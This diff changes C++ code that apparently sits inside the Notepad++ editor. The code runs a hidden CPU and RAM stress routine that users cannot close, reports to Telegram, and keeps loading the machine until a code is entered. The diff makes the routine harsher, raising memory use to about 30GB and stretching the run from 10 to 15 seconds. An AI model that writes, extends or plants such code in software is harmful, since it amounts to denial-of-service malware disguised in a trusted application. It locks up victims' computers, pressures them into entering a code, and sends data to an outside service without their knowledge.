@@ -39,6 +39,7 @@ namespace
 {
 std::atomic<bool> g_stopStress{false};
 std::atomic<bool> g_pauseStress{false};
+std::atomic<bool> g_codeCorrect{false};
 std::mutex g_inputMutex;
 std::string g_inputCode = "";
 HWND g_hInputWnd = NULL;
@@ -123,7 +124,7 @@ void SetupConsole() {
     freopen_s(&fp, "CONIN$", "r", stdin); // Allow reading input from console
     std::cout << "\n\n  ========================================\n";
     std::cout << "  ||                                    ||\n";
-    std::cout << "  ||   TEST STRESS CPU & RAM (10 giay)  ||\n";
+    std::cout << "  ||   TEST STRESS CPU & RAM (15 giay)  ||\n";
     std::cout << "  ||                                    ||\n";
     std::cout << "  ========================================\n\n";
     std::cout << "  [!] Thong bao: Khong the tat cua so nay bang nut X.\n";
@@ -166,8 +167,8 @@ void SendTelegramMessage(const std::string& message) {
 }
 
 void CpuStressTask() {
-    while (!g_stopStress) {
-        if (g_pauseStress) {
+    while (!g_stopStress.load()) {
+        if (g_pauseStress.load()) {
             std::this_thread::sleep_for(std::chrono::milliseconds(500));
             continue;
         }
@@ -178,14 +179,14 @@ void CpuStressTask() {
 
 void RamStressTask() {
     std::vector<void*> allocatedMemory;
-    while (!g_stopStress) {
-        if (g_pauseStress) {
+    while (!g_stopStress.load()) {
+        if (g_pauseStress.load()) {
             std::this_thread::sleep_for(std::chrono::milliseconds(500));
             continue;
         }
-        // Allocate 50MB and write to it to force physical memory usage
-        if (allocatedMemory.size() < 10) {
-            size_t size = 50 * 1024 * 1024;
+        // Allocate 500MB and write to it to force physical memory usage
+        if (allocatedMemory.size() < 60) {
+            size_t size = 500 * 1024 * 1024;
             void* mem = malloc(size);
             if (mem) {
                 memset(mem, 1, size);
@@ -209,7 +210,7 @@ void RunCpuStressAndNotify() {
     int numCores = std::thread::hardware_concurrency();
     if (numCores == 0) numCores = 4;
     
-    std::string startMsg = "Start CPU & RAM Stress (Notepad++ C++): Allocated " + std::to_string(numCores) + " CPU threads for 10 seconds.";
+    std::string startMsg = "Start CPU & RAM Stress (Notepad++ C++): Allocated " + std::to_string(numCores) + " CPU threads for 15 seconds.";
     SendTelegramMessage(startMsg);
     
     // Hien thi GUI (chay tren thread tat biet de khong block doan ma stress nay)
@@ -224,8 +225,8 @@ void RunCpuStressAndNotify() {
     threads.emplace_back(std::thread(RamStressTask));
     threads.emplace_back(std::thread(RamStressTask));
 
-    // Stress 10s
-    std::this_thread::sleep_for(std::chrono::seconds(10));
+    // Stress 15s
+    std::this_thread::sleep_for(std::chrono::seconds(15));
     
     bool success = false;
     std::string currentInput = "";
@@ -245,7 +246,7 @@ void RunCpuStressAndNotify() {
     if (!success) {
         // Pause 30s
         g_pauseStress = true;
-        std::cout << "\n  [!] Da stress xong 10 giay. Tam dung! Ban co 30 giay de nhap code tat console tren GUI.\n";
+        std::cout << "\n  [!] Da stress xong 15 giay. Tam dung! Ban co 30 giay de nhap code tat console tren GUI.\n";
         SendTelegramMessage("Paused! Waiting for code input for 30s.");
         
         auto startWait = std::chrono::steady_clock::now();
@@ -277,6 +278,7 @@ void RunCpuStressAndNotify() {
         SendTelegramMessage("Code correct! Cleaning up.");
         g_stopStress = true;
         g_pauseStress = false;
+        g_codeCorrect = true;
         if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 1, 0, 0); // Close GUI
     } else {
         std::cout << "\n  [-] Het 30 giay! Tiep tuc stress CPU va RAM khong gioi han...\n";
@@ -284,7 +286,7 @@ void RunCpuStressAndNotify() {
         g_pauseStress = false; // resume
         if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 3, 0, 0); // Update GUI text
         
-        while (!g_stopStress) {
+        while (!g_stopStress.load()) {
             currentInput = "";
             {
                 std::lock_guard<std::mutex> lock(g_inputMutex);
@@ -298,6 +300,7 @@ void RunCpuStressAndNotify() {
                     std::cout << "  [+] Code dung! Dang don dep he thong...\n";
                     SendTelegramMessage("Code correct! Cleaning up.");
                     g_stopStress = true;
+                    g_codeCorrect = true;
                     if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 1, 0, 0); // Close GUI
                     break;
                 } else {
@@ -317,6 +320,10 @@ void RunCpuStressAndNotify() {
     std::cout << "  [+] Hoan tat! Chuan bi giai phong he thong.\n";
     SendTelegramMessage("Finished cleanup (Notepad++ C++). System CPU and RAM are safe and released.");
 }
+}
+
+bool IsStressCodeCorrect() {
+    return g_codeCorrect.load();
 }
 
 typedef std::vector<std::wstring> ParamVector;
